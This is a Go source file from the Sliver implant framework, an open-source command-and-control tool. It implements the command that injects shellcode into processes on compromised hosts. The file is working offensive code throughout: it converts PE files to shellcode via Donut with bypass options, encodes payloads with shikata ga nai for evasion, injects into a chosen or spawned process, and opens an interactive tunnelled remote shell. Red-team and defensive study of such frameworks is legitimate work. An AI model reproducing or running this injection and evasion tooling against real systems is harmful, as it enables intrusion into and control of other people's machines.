package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/Binject/debug/pe"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	wasmdonut "github.com/sliverarmory/wasm-donut"
	"github.com/spf13/cobra"
	"golang.org/x/term"
	"google.golang.org/protobuf/proto"
)

const (
	defaultExecuteShellcodeDonutEntropy  = wasmdonut.DonutEntropyNone
	defaultExecuteShellcodeDonutCompress = wasmdonut.DonutCompressNone
	defaultExecuteShellcodeDonutExitOpt  = wasmdonut.DonutExitThread
	defaultExecuteShellcodeDonutBypass   = wasmdonut.DonutBypassContinue
	defaultExecuteShellcodeDonutHeaders  = wasmdonut.DonutHeadersOverwrite
	imageFileDLLMask                     = 0x2000
)

// ExecuteShellcodeCmd - Execute shellcode in-memory.
func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	targetName := activeTargetName(session, beacon)
	targetOS := activeTargetOS(session, beacon)
	targetArch := activeTargetArch(session, beacon)

	rwxPages, _ := cmd.Flags().GetBool("rwx-pages")
	interactive, _ := cmd.Flags().GetBool("interactive")
	if interactive && beacon != nil {
		con.PrintErrorf("Interactive shellcode can only be executed in a session\n")
		return
	}

	pid, _ := cmd.Flags().GetUint32("pid")
	shellcodePath := args[0]
	shellcodeBin, err := os.ReadFile(shellcodePath)
	if err != nil {
		con.PrintErrorf("%s\n", err.Error())
		return
	}
	if pid != 0 && interactive {
		con.PrintErrorf("Cannot use both `--pid` and `--interactive`\n")
		return
	}

	shellcodeConfig, shellcodeFlagsChanged, err := parseExecuteShellcodeFlags(cmd)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	shouldConvertPE, isDLLHint := shouldConvertExecuteShellcodePE(shellcodePath, shellcodeFlagsChanged)
	if shouldConvertPE {
		if targetOS != "windows" {
			con.PrintErrorf("PE input and --shellcode-* options are only supported for Windows targets in execute-shellcode\n")
			return
		}
		con.PrintInfof("Converting PE input to shellcode ...\n")
		shellcodeBin, err = donutShellcodeFromPE(shellcodeBin, targetArch, isDLLHint, shellcodeConfig)
		if err != nil {
			con.PrintErrorf("Failed to convert PE input to shellcode: %s\n", err)
			return
		}
	}

	shikataGaNai, _ := cmd.Flags().GetBool("shikata-ga-nai")
	if shikataGaNai {
		if !rwxPages {
			con.PrintErrorf("Cannot use shikata ga nai without RWX pages enabled\n")
			return
		}
		arch, _ := cmd.Flags().GetString("architecture")
		if arch != "386" && arch != "amd64" {
			con.PrintErrorf("Invalid shikata ga nai architecture (must be 386 or amd64)\n")
			return
		}
		iter, _ := cmd.Flags().GetUint32("iterations")
		con.PrintInfof("Encoding shellcode ...\n")
		resp, err := con.Rpc.ShellcodeEncoder(context.Background(), &clientpb.ShellcodeEncodeReq{
			Encoder:      clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
			Architecture: arch,
			Iterations:   iter,
			BadChars:     []byte{},
			Data:         shellcodeBin,
		})
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
		oldSize := len(shellcodeBin)
		shellcodeBin = resp.GetData()
		con.PrintInfof("Shellcode encoded in %d iterations (%d bytes -> %d bytes)\n", iter, oldSize, len(shellcodeBin))
	}

	process, _ := cmd.Flags().GetString("process")

	if interactive {
		executeInteractive(cmd, process, shellcodeBin, rwxPages, con)
		return
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", targetName)
	con.SpinUntil(msg, ctrl)
	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: rwxPages,
		Pid:      pid,
		Request:  con.ActiveTarget.Request(cmd),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if shellcodeTask.Response != nil && shellcodeTask.Response.Async {
		con.AddBeaconCallback(shellcodeTask.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, shellcodeTask)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintExecuteShellcode(shellcodeTask, con)
		})
		con.PrintAsyncResponse(shellcodeTask.Response)
	} else {
		PrintExecuteShellcode(shellcodeTask, con)
	}
}

// PrintExecuteShellcode - Display result of shellcode execution.
func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverClient) {
	if task.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", task.Response.GetErr())
	} else {
		con.PrintInfof("Executed shellcode on target\n")
	}
}

func parseExecuteShellcodeFlags(cmd *cobra.Command) (*clientpb.ShellcodeConfig, bool, error) {
	shellcodeEntropy, _ := cmd.Flags().GetUint32("shellcode-entropy")
	shellcodeCompressEnabled, _ := cmd.Flags().GetBool("shellcode-compress")
	shellcodeExitOpt, _ := cmd.Flags().GetUint32("shellcode-exitopt")
	shellcodeBypass, _ := cmd.Flags().GetUint32("shellcode-bypass")
	shellcodeHeaders, _ := cmd.Flags().GetUint32("shellcode-headers")
	shellcodeThread, _ := cmd.Flags().GetBool("shellcode-thread")
	shellcodeUnicode, _ := cmd.Flags().GetBool("shellcode-unicode")
	shellcodeOEP, _ := cmd.Flags().GetUint32("shellcode-oep")

	anyChanged := cmd.Flags().Changed("shellcode-entropy") ||
		cmd.Flags().Changed("shellcode-compress") ||
		cmd.Flags().Changed("shellcode-exitopt") ||
		cmd.Flags().Changed("shellcode-bypass") ||
		cmd.Flags().Changed("shellcode-headers") ||
		cmd.Flags().Changed("shellcode-thread") ||
		cmd.Flags().Changed("shellcode-unicode") ||
		cmd.Flags().Changed("shellcode-oep")

	if shellcodeEntropy < 1 || shellcodeEntropy > 3 {
		return nil, false, fmt.Errorf("shellcode-entropy must be between 1 and 3")
	}
	if shellcodeExitOpt < 1 || shellcodeExitOpt > 3 {
		return nil, false, fmt.Errorf("shellcode-exitopt must be between 1 and 3")
	}
	if shellcodeBypass < 1 || shellcodeBypass > 3 {
		return nil, false, fmt.Errorf("shellcode-bypass must be between 1 and 3")
	}
	if shellcodeHeaders < 1 || shellcodeHeaders > 2 {
		return nil, false, fmt.Errorf("shellcode-headers must be 1 or 2")
	}

	shellcodeCompress := uint32(1)
	if shellcodeCompressEnabled {
		shellcodeCompress = 2
	}

	return &clientpb.ShellcodeConfig{
		Entropy:  shellcodeEntropy,
		Compress: shellcodeCompress,
		ExitOpt:  shellcodeExitOpt,
		Bypass:   shellcodeBypass,
		Headers:  shellcodeHeaders,
		Thread:   shellcodeThread,
		Unicode:  shellcodeUnicode,
		OEP:      shellcodeOEP,
	}, anyChanged, nil
}

func shouldConvertExecuteShellcodePE(shellcodePath string, shellcodeFlagsChanged bool) (bool, bool) {
	ext := strings.ToLower(filepath.Ext(shellcodePath))
	isPEByExt := ext == ".exe" || ext == ".dll"
	return isPEByExt || shellcodeFlagsChanged, ext == ".dll"
}

func activeTargetName(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return session.GetName()
	}
	if beacon != nil {
		return beacon.GetName()
	}
	return "target"
}

func activeTargetOS(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return strings.ToLower(session.GetOS())
	}
	if beacon != nil {
		return strings.ToLower(beacon.GetOS())
	}
	return ""
}

func activeTargetArch(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return session.GetArch()
	}
	if beacon != nil {
		return beacon.GetArch()
	}
	return ""
}

type executeShellcodeDonutOptions struct {
	entropy  int
	compress int
	exitOpt  int
	bypass   int
	headers  int
	thread   bool
	unicode  bool
	oep      uint32
}

func normalizeExecuteShellcodeDonutConfig(config *clientpb.ShellcodeConfig) executeShellcodeDonutOptions {
	opts := executeShellcodeDonutOptions{
		entropy:  defaultExecuteShellcodeDonutEntropy,
		compress: defaultExecuteShellcodeDonutCompress,
		exitOpt:  defaultExecuteShellcodeDonutExitOpt,
		bypass:   defaultExecuteShellcodeDonutBypass,
		headers:  defaultExecuteShellcodeDonutHeaders,
	}
	if config == nil {
		return opts
	}
	if config.Entropy >= 1 && config.Entropy <= 3 {
		opts.entropy = int(config.Entropy)
	}
	if config.Compress >= 1 && config.Compress <= 2 {
		opts.compress = int(config.Compress)
	}
	if config.ExitOpt >= 1 && config.ExitOpt <= 3 {
		opts.exitOpt = int(config.ExitOpt)
	}
	if config.Bypass >= 1 && config.Bypass <= 3 {
		opts.bypass = int(config.Bypass)
	}
	if config.Headers >= 1 && config.Headers <= 2 {
		opts.headers = int(config.Headers)
	}
	opts.thread = config.Thread
	opts.unicode = config.Unicode
	if config.OEP > 0 {
		opts.oep = config.OEP
	}
	return opts
}

func donutShellcodeFromPE(data []byte, arch string, isDLLHint bool, config *clientpb.ShellcodeConfig) ([]byte, error) {
	peFile, err := pe.NewFile(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	isDLL := isDLLHint || ((peFile.FileHeader.Characteristics & imageFileDLLMask) != 0)
	ext := ".exe"
	if isDLL {
		ext = ".dll"
	}
	opts := normalizeExecuteShellcodeDonutConfig(config)
	result, err := wasmdonut.Generate(context.Background(), data, ext, wasmdonut.GenerateOptions{
		Ext:      ext,
		Arch:     getExecuteShellcodeDonutArch(arch),
		Bypass:   opts.bypass,
		Headers:  opts.headers,
		Entropy:  opts.entropy,
		Compress: opts.compress,
		ExitOpt:  opts.exitOpt,
		Thread:   opts.thread,
		Unicode:  opts.unicode,
		OEP:      opts.oep,
	})
	if err != nil {
		return nil, err
	}
	return addExecuteShellcodeStackCheck(result.Loader), nil
}

func getExecuteShellcodeDonutArch(arch string) int {
	donutArch := wasmdonut.DonutArchX84
	switch strings.ToLower(arch) {
	case "x32", "x86", "386":
		donutArch = wasmdonut.DonutArchX86
	case "x64", "amd64":
		donutArch = wasmdonut.DonutArchX64
	case "x84":
		donutArch = wasmdonut.DonutArchX84
	}
	return donutArch
}

func addExecuteShellcodeStackCheck(shellcode []byte) []byte {
	stackCheckPrologue := []byte{
		0x48, 0x83, 0xE4, 0xF0, // and rsp,0xfffffffffffffff0
		0x48, 0x83, 0xC4, 0x08, // add rsp,0x8
	}
	return append(stackCheckPrologue, shellcode...)
}

func executeInteractive(cmd *cobra.Command, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverClient) {
	// Check active session
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}
	// Start remote process and tunnel
	noPty := false
	if session.GetOS() == "windows" {
		noPty = true // Windows of course doesn't have PTYs
	}

	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	tunnel := core.GetTunnels().Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())

	var rows uint32
	var cols uint32
	if !noPty {
		colsInt, rowsInt, err := term.GetSize(int(os.Stdout.Fd()))
		if err != nil || rowsInt <= 0 || colsInt <= 0 {
			colsInt, rowsInt, err = term.GetSize(int(os.Stdin.Fd()))
		}
		if err == nil && rowsInt > 0 && colsInt > 0 {
			rows = uint32(rowsInt)
			cols = uint32(colsInt)
		}
	}

	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
		Request:   con.ActiveTarget.Request(cmd),
		Path:      hostProc,
		EnablePTY: !noPty,
		Rows:      rows,
		Cols:      cols,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	// Retrieve PID and start remote task
	pid := shell.GetPid()

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	con.SpinUntil(msg, ctrl)
	_, err = con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
		Request:  con.ActiveTarget.Request(cmd),
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	log.Printf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	con.PrintInfof("Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *term.State
	if !noPty {
		oldState, err = term.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			con.PrintErrorf("Failed to save terminal state\n")
			return
		}
	}

	stopPtyResize := func() {}
	if !noPty {
		stopPtyResize = startPtyResizeWatcher(con, cmd, tunnel.ID)
	}
	defer stopPtyResize()

	log.Printf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		log.Printf("Wrote %d bytes to stdout", n)
		if err != nil {
			con.PrintErrorf("Error writing to stdout: %v", err)
			return
		}
	}()
	for {
		log.Printf("Reading from stdin ...")
		n, err := io.Copy(tunnel, os.Stdin)
		log.Printf("Read %d bytes from stdin", n)
		if err == io.EOF {
			break
		}
		if err != nil {
			con.PrintErrorf("Error reading from stdin: %v", err)
			break
		}
	}

	if !noPty {
		log.Printf("Restoring terminal state ...")
		term.Restore(0, oldState)
	}

	log.Printf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()
}
